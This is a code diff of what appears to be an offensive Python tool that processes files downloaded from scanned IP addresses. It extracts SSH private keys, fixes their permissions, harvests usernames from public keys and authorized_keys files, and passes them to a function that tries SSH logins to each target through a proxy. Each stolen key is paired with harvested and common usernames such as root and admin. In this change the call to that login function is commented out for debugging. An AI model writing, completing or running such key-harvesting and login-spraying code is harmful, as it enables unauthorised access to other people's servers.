@@ -16,6 +16,8 @@ def get_directories(dir_path_root: str):
 
 # test if ip address is valid or not
 def test_ipaddress(address: str):
+    if ":" in address:
+        address = address.split(":")[0]
     try:
         ipaddress.ip_address(address)
         return True
@@ -47,9 +49,15 @@ def get_private_key(ssh_files: list):
     for file in ssh_files:
         with open(file, "r") as fp:
             top_line = fp.readline()
+            # really weak match, but it will do for now
             if "-----" in top_line:
                 private_keys_found.append(file)
+    chmod_priv_keys(private_keys_found)
     return private_keys_found
+
+def chmod_priv_keys(private_keys: list) -> None:
+    for key in private_keys:
+        os.chmod(key, 0o600)
                 
 def get_public_keys(ssh_files: list):
     # pub keys could be in two spots, the authorized_keys
@@ -67,11 +75,13 @@ def get_public_keys(ssh_files: list):
 def get_username_from_file_contents(contents: list):
     valid_usernames = set()
     blacklist = ["generated-by-azure", "imported-openssh-key"]
+
     for line in contents:
-        if len(line.split(" ")) != 3:
+        sanitized_line = [x.strip() for x in line.split() if x]
+        if len(sanitized_line) < 3:
             continue # means no username at the end ssh-xxxx keyvaluehere root@targets
         else:
-            username = line.split(" ")[-1].strip()
+            username = sanitized_line[-1]
             if username in blacklist:
                 continue
             else:
@@ -90,24 +100,42 @@ def get_contents_from_pub_keys(public_keys: list):
         all_usernames.update(get_username_from_file_contents(file_lines))
     return all_usernames
 
-def get_all_targets(proxy_host_port: str):
+def check_downloads_dir(proxy_host_port: str):
     if not os.path.isdir("downloads"):
         print("[-] No downloads directory found. Run a scan with -e first to download files.")
         return
+    get_all_targets(proxy_host_port)
+
+def debug_get_all_targets(target: str):
+    print(f"Parsing: {target}")
+    print(f"Passed: {test_ipaddress(target)}")
+
+
+
+def get_all_targets(proxy_host_port: str):
     for target in os.listdir("downloads"):
+        # debug_get_all_targets(target)
         if test_ipaddress(target):
             downloaded_files = get_directories(os.path.join("downloads", target))
+            # print(downloaded_files)
             ssh_files = get_ssh_files(downloaded_files)
+            # print(ssh_files)
             if len(ssh_files) == 0:
                 continue
             # get a list of all the targets private keys
             list_of_private_keys = get_private_key(ssh_files)
-            # get a list of all the targets public keys 
+            # print(list_of_private_keys)
+            # get a list of all the targets public keys, authorized_keys is treated as a public key in this sense
+            # as it can often have a username at the end of the public key <pub key> root@hostname we want to 
+            # include the file and check for this to add it to our username list 
             list_of_public_keys = get_public_keys(ssh_files)
+            # print(list_of_public_keys)
             # parse the public keys for valid usernames and get a list of valid usernames
             usernames = get_contents_from_pub_keys(list_of_public_keys)
+            print(usernames)
+            '''
             do_executor(target, usernames, list_of_private_keys, proxy_host_port)
-
+            '''
 
 def do_executor(target: str, usernames_from_pub_keys: set, priv_keys: list, proxy_host_port: str):
     usernames = ["root", "admin", "test", "guest", "info", "adm",
@@ -116,7 +144,6 @@ def do_executor(target: str, usernames_from_pub_keys: set, priv_keys: list, prox
                  "azureuser"]
     comb_usernames = list(usernames_from_pub_keys) + usernames
     for priv_key in priv_keys:
-        os.chmod(priv_key, 0o600)
         for name in comb_usernames:
             ssh_target = SSHTarget(proxy_host_port, target, 22, name, key=str(priv_key))
             print(f"[*] {proxy_host_port} -> {ssh_target.username}@{ssh_target.host}:{ssh_target.port} {ssh_target.key}")
